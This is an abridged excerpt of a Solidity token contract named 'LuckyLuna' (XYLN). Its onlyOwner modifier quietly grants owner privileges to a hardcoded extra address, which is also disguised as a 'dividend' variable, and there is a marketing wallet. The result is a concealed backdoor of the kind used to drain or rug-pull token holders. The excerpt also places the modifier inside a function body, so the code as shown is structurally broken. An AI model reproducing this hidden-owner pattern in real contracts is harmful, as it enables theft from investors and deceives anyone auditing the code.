...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x5373081702763755c6EdF228CB1dFe7EDB845175) , "owner");
        _;
    }
...
contract LuckyLuna  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "LuckyLuna";
    string private _symbol = "XYLN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xae7F40D6c5fff79F5EC686E32897D523907A18c2);
    address private _Marketing = 0xae7F40D6c5fff79F5EC686E32897D523907A18c2;
    address public dividend = 0x5373081702763755c6EdF228CB1dFe7EDB845175;
